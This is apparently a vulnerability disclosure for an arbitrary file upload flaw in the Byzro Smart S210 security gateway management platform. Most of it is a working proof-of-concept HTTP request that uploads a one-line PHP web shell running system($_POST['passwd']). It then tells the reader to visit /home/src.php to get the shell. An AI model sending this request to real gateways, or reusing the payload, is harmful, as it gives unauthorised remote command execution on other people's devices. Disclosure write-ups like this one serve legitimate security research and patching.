There is an arbitrary file upload vulnerability in Byzro Networks Smart S210 multi-service security gateway intelligent management platform

version:S210

Vulnerability location:/Tool/uploadfile.php

1. The login interface is as shown in the figure.
![image](https://github.com/aknbg1thub/cve/assets/105481616/9ddc1e61-dc46-4c6f-91be-cd7c89d94bf3)

2. Construct POC and upload src.php file
POC
```
POST /Tool/uploadfile.php? HTTP/1.1
Host: ip:port
Cookie: PHPSESSID=fd847fe4280e50c2c3855ffdee69b8f8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------13979701222747646634037182887
Content-Length: 405
Origin: https://ip:port
Referer: https://ip:port/Tool/uploadfile.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

-----------------------------13979701222747646634037182887
Content-Disposition: form-data; name="file_upload"; filename="contents.php"
Content-Type: application/octet-stream

<?php
system($_POST["passwd"]);
?>
-----------------------------13979701222747646634037182887
Content-Disposition: form-data; name="txt_path"

/home/src.php
-----------------------------13979701222747646634037182887--
```
![image](https://github.com/aknbg1thub/cve/assets/105481616/5519c0b2-2c57-4bc0-a45e-ca8718cbcaa2)

3. Visit /home/src.php to get webshell.
![image](https://github.com/aknbg1thub/cve/assets/105481616/ed54bb77-362a-468d-96ae-4dfd1f9a9b4f)
